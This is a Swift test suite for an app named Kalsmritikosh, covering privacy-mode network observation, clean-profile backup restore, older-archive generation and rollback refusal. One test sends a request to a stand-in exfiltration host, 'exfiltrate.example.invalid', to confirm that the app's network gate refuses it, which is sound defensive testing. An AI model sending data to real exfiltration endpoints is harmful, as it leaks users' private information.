//
//  SimulatedReleaseTests.swift
//  KalsmritikoshTests
//
//  Unified path R2-E (owner 2026-11-22 round 2) — the in-process part of the SIMULATED release rows, run in the test
//  phase (directly, or by scripts/sim/run-simulations.sh which sets KALS_SIM_OUT and collects the reports):
//    SEC-09       network observation of privacy modes at the app's one network door (no real send)
//    RECOVERY-04  restore into a clean, never-used profile folder with no caches; sources, history, deep links
//    QA-10        a generated older ledger + manifest for ci/migrations/verify-real-archive.sh (the real-archive path)
//    SHIP-10      rollback: an older app never opens (or changes) a ledger written by a newer one
//

import Foundation
import Testing
import CryptoKit
@testable import Kalsmritikosh

@Suite("SIMULATED release rows (R2-E)", .serialized)
struct SimulatedReleaseTests {

    // MARK: SEC-09

    @Test("SIMULATED network observation: Private sends nothing, a declined consent sends nothing, a consented send is one recorded attempt, a disallowed host is refused at the door")
    func networkObservationByMode() async throws {
        let db = try await MigrationFixtureBuilder.database(atVersion: SchemaMigrations.latestVersion)
        let reply = Data(#"{"content":[{"type":"text","text":"ok"}],"usage":{"input_tokens":3,"output_tokens":2}}"#.utf8)
        func provider(cloudAllowed: Bool, consent: Bool) -> OnlineCloudProvider {
            let snapshot = OnlineSnapshot(cloudAllowed: cloudAllowed, kind: .anthropic, model: "test-model", apiKey: "test-key",
                                          confirmedDocumentTerms: OnlineProviderKind.anthropic.documentTermsVersion, dailyByteCap: nil)
            // The transport stands in for the helper: it notes the hand-over exactly as the door does, and sends nothing.
            var seams = OnlineCloudProvider.Seams(settings: { snapshot }, consent: { _ in consent }, transport: { req in
                NetworkObservation.note(url: req.url, method: req.method, purpose: req.purpose, outcome: .handedToHelper)
                return OutboundHTTPResponse(status: 200, body: reply)
            })
            seams.ownKeyRefusal = { _ in nil }
            seams.ownKeyTally = { _, _ in }
            return OnlineCloudProvider(outboundLog: OutboundLogRepository(database: db), knownNames: { [] }, seams: seams)
        }
        var all: [NetworkObservationEntry] = []
        for (mode, allowed, consent, expected) in [("private", false, true, 0), ("online-declined", true, false, 0), ("online-consented", true, true, 1)] {
            NetworkObservation.start(mode: mode)
            _ = try? await provider(cloudAllowed: allowed, consent: consent).generateQuestionOnly(prompt: "a question", options: GenerationOptions(maxTokens: 8))
            let e = NetworkObservation.stop().filter { $0.host == "api.anthropic.com" }
            #expect(e.count == expected, "\(mode): \(e)")
            all += e
        }
        NetworkObservation.start(mode: "any")
        await #expect(throws: (any Error).self) {
            _ = try await NetworkHelperClient.send(OutboundHTTPRequest(url: "https://exfiltrate.example.invalid/x", headers: [:], body: Data()))
        }
        let refused = NetworkObservation.stop().filter { $0.host == "exfiltrate.example.invalid" }
        #expect(refused.count == 1 && refused.first?.outcome == .refusedBeforeLeaving)
        all += refused
        let report = NetworkObservation.report(all)
        #expect(!report.contains("a question"), "the record is content-free")
        try SimulationArtifacts.write(report, name: "network-observation.md")
    }

    // MARK: RECOVERY-04

    @Test("SIMULATED clean-profile restore: a never-used profile folder, no caches; the case, its history and links work")
    func cleanProfileRestore() async throws {
        let f = try await CaseFileTests.fixture(title: "Clean profile")
        _ = try await f.file.addAllegation(caseID: f.caseID, text: "Was the invoice paid twice?", actor: "Ada")
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("sim-clean-profile-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let snapDir = root.appendingPathComponent("old-mac", isDirectory: true)
        try FileManager.default.createDirectory(at: snapDir, withIntermediateDirectories: true)
        let snap = snapDir.appendingPathComponent("knowledge.sqlite")
        try await f.db.backupSnapshot(to: snap)
        let backup = root.appendingPathComponent("backup", isDirectory: true)
        try FileManager.default.createDirectory(at: backup, withIntermediateDirectories: true)
        _ = try BackupService().createCompleteBackup(databaseSnapshot: snap, originals: [], notIncluded: ["originals left in place"], destination: backup,
                                                     schemaVersion: SchemaMigrations.latestVersion, nowEpoch: Date().timeIntervalSince1970 - 60)
        try FileManager.default.removeItem(at: snapDir)                       // the old Mac is gone
        // A fresh profile: its own home with an empty Application Support, nothing cached.
        let profile = root.appendingPathComponent("fresh-home/Library/Application Support/Kalsmritikosh", isDirectory: true)
        try FileManager.default.createDirectory(at: profile, withIntermediateDirectories: true)
        #expect(try FileManager.default.contentsOfDirectory(atPath: profile.path).isEmpty)
        _ = try await BackupService().restoreComplete(backupFolder: backup, into: profile)
        let restored = try Database(url: profile.appendingPathComponent("knowledge.sqlite"))
        try await SchemaMigrations.migrate(restored)
        let cases = InvestigationCaseRepository(database: restored)
        #expect(try await cases.fetch(caseID: f.caseID) != nil, "the case is there")
        let history = try await cases.auditChainEvents()
        #expect(!history.isEmpty, "its history is there")
        let link = try #require(DeepLink.document(id: UUID(), quote: "paid twice").url)
        #expect(DeepLink(url: link) != nil, "links parse on the new profile")
        let leftovers = try FileManager.default.subpathsOfDirectory(atPath: profile.path).filter { $0.lowercased().contains("cache") }
        #expect(leftovers.isEmpty, "no old caches came along: \(leftovers)")
        await restored.close()
        try SimulationArtifacts.write("# SIMULATED clean-profile restore\n\nRestored into a never-used profile folder (not a fresh macOS account). Case, history and link parsing checked. A fresh account or second Mac is still needed for release.\n",
                                      name: "clean-profile-restore.md")
    }

    // MARK: QA-10

    @Test("SIMULATED older archive: a generated v160 ledger and its manifest for verify-real-archive.sh")
    func generateOlderArchive() async throws {
        let out = SimulationArtifacts.folder().appendingPathComponent("archive", isDirectory: true)
        try FileManager.default.createDirectory(at: out, withIntermediateDirectories: true)
        let url = out.appendingPathComponent("sim-history-v160.sqlite")
        for suffix in ["", "-wal", "-shm"] { try? FileManager.default.removeItem(atPath: url.path + suffix) }
        let db = try await MigrationFixtureBuilder.database(atVersion: 160, at: url)
        _ = try await MigrationFixtureBuilder.seedPreservationRows(into: db, forVersion: 160)
        let files = Int(try await db.query("SELECT COUNT(*) FROM files;", []).first?.int(0) ?? 0)
        let kos = Int(try await db.query("SELECT COUNT(*) FROM knowledge_objects;", []).first?.int(0) ?? 0)
        let fileID = try await db.query("SELECT id FROM files LIMIT 1;", []).first?.string(0)
        try await db.exec("PRAGMA wal_checkpoint(TRUNCATE);")
        await db.close()
        let hash = SHA256.hash(data: try Data(contentsOf: url)).map { String(format: "%02x", $0) }.joined()
        let manifest: [String: Any] = [
            "fixtureID": "SIMULATED-generated-v160", "originalSchemaVersion": 160, "sanitizerVersion": "simulated-generator-1",
            "containsPersonalData": false, "sourceDatabaseSHA256": hash, "expectedEndVersion": SchemaMigrations.latestVersion,
            "expectedCounts": ["files": files, "knowledge_objects": kos], "representative": ["fileID": fileID as Any],
        ]
        try JSONSerialization.data(withJSONObject: manifest, options: [.prettyPrinted, .sortedKeys]).write(to: out.appendingPathComponent("sim-history-v160.json"))
        #expect(files >= 1 && fileID != nil)
    }

    // MARK: SHIP-10

    @Test("SIMULATED rollback: a ledger from a newer app version is refused by this one and left byte-for-byte unchanged")
    func rollbackNeverDowngrades() async throws {
        let url = MigrationFixtureBuilder.newTemporaryURL()
        let db = try await MigrationFixtureBuilder.database(atVersion: SchemaMigrations.latestVersion, at: url)
        try await db.setUserVersion(SchemaMigrations.latestVersion + 1)       // written by "the next release"
        try await db.exec("PRAGMA wal_checkpoint(TRUNCATE);")
        await db.close()
        let before = try Data(contentsOf: url)
        let older = try Database(url: url)
        await #expect(throws: (any Error).self) { try await SchemaMigrations.migrate(older) }
        await older.close()
        #expect(try Data(contentsOf: url) == before, "the newer ledger was not changed")
    }
}
